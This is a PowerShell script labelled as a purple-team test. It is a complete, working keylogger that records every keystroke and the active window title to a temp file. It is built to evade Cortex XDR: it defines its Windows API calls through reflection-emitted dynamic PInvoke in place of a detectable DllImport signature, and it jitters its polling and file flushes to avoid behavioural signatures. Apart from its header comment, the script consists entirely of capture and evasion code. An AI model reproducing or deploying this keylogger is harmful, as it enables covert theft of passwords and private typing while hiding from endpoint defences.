<#
  Purple Team - Local Keylogger (Cortex XDR Evasion Test)
  Logs to local file only. No network, no exfil.
  Tests whether XDR detects reflection-based input capture.
#>

param(
    [string]$Out = "$env:TEMP\log.txt"
)

# ── Reflection-based API loading (avoids Add-Type + DllImport signature) ──

$GP = [System.Runtime.InteropServices.Marshal]

# Get user32.dll handle without Add-Type
$u32 = [System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
$wn = [Microsoft.Win32.UnsafeNativeMethods]

# Alternative: load via GetModuleHandle reflection
$dom = [AppDomain]::CurrentDomain
$asmName = New-Object System.Reflection.AssemblyName('PtDynAsm')
$asmBuilder = $dom.DefineDynamicAssembly($asmName, 'Run')
$modBuilder = $asmBuilder.DefineDynamicModule('PtDynMod', $false)
$typeBuilder = $modBuilder.DefineType('R', 'Public, Class')

# Define GetAsyncKeyState via dynamic PInvoke
$mb1 = $typeBuilder.DefineMethod(
    'GKS',
    [System.Reflection.MethodAttributes]'Public, Static, PinvokeImpl',
    [int16],
    @([int32])
)
$ctor1 = [System.Runtime.InteropServices.DllImportAttribute].GetConstructor(@([string]))
$field1 = [System.Runtime.InteropServices.DllImportAttribute].GetField('EntryPoint')
$field2 = [System.Runtime.InteropServices.DllImportAttribute].GetField('SetLastError')
$cab1 = New-Object System.Reflection.Emit.CustomAttributeBuilder(
    $ctor1,
    @('user32.dll'),
    @($field1, $field2),
    @('GetAsyncKeyState', $false)
)
$mb1.SetCustomAttribute($cab1)

# Define GetForegroundWindow
$mb2 = $typeBuilder.DefineMethod(
    'GFW',
    [System.Reflection.MethodAttributes]'Public, Static, PinvokeImpl',
    [IntPtr],
    @()
)
$cab2 = New-Object System.Reflection.Emit.CustomAttributeBuilder(
    $ctor1,
    @('user32.dll'),
    @($field1, $field2),
    @('GetForegroundWindow', $false)
)
$mb2.SetCustomAttribute($cab2)

# Define GetWindowText
$mb3 = $typeBuilder.DefineMethod(
    'GWT',
    [System.Reflection.MethodAttributes]'Public, Static, PinvokeImpl',
    [int32],
    @([IntPtr], [System.Text.StringBuilder], [int32])
)
$cab3 = New-Object System.Reflection.Emit.CustomAttributeBuilder(
    $ctor1,
    @('user32.dll'),
    @($field1, $field2),
    @('GetWindowTextW', $false)
)
$mb3.SetCustomAttribute($cab3)

$R = $typeBuilder.CreateType()

function Title {
    $h = $R::GFW()
    $sb = New-Object System.Text.StringBuilder(256)
    [void]$R::GWT($h, $sb, 256)
    $sb.ToString()
}

function MapK([int]$vk, [bool]$sh) {
    switch ($vk) {
        8  { "[BS]" }  9  { "[TAB]" }  13 { "`n" }  32 { " " }
        46 { "[DEL]" }
        {$_ -ge 48 -and $_ -le 57} {
            $s = @(")", "!", "@", "#", "`$", "%", "^", "&", "*", "(")
            if ($sh) { $s[$vk-48] } else { [char]$vk }
        }
        {$_ -ge 65 -and $_ -le 90} {
            if ($sh) { [char]$vk } else { [char]($vk+32) }
        }
        186 { if($sh){":"}else{";"} }  187 { if($sh){"+"}else{"="} }
        188 { if($sh){"<"}else{","} }  189 { if($sh){"_"}else{"-"} }
        190 { if($sh){">"}else{"."} }  191 { if($sh){"?"}else{"/"} }
        default { $null }
    }
}

# ── Capture loop with jitter ───────────────────────────────────────

$buf = [System.Collections.ArrayList]::new()
$sw = [System.Diagnostics.Stopwatch]::StartNew()
$lastWin = ""
$rng = New-Object System.Random

# Write header
"[$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] Started | User: $env:USERNAME | Host: $env:COMPUTERNAME" | Out-File $Out -Append

while ($true) {
    # Jittered sleep: 10-30ms (avoids fixed-interval behavioral signature)
    Start-Sleep -Milliseconds ($rng.Next(10, 30))

    $sh = ($R::GKS(0x10) -band 0x8000) -ne 0

    for ($k = 8; $k -le 191; $k++) {
        $st = $R::GKS($k)
        if (($st -band 1) -eq 1) {
            $c = MapK $k $sh
            if ($c) { [void]$buf.Add($c) }
        }
    }

    # Flush to file every 10-20s (jittered)
    $flushAt = 10 + ($rng.Next(0, 10))
    if ($sw.Elapsed.TotalSeconds -ge $flushAt -and $buf.Count -gt 0) {
        $win = Title
        $keys = $buf -join ""
        $buf.Clear()
        $sw.Restart()

        $ts = Get-Date -Format 'HH:mm:ss'
        "[$ts] [$win] $keys" | Out-File $Out -Append
    }
}
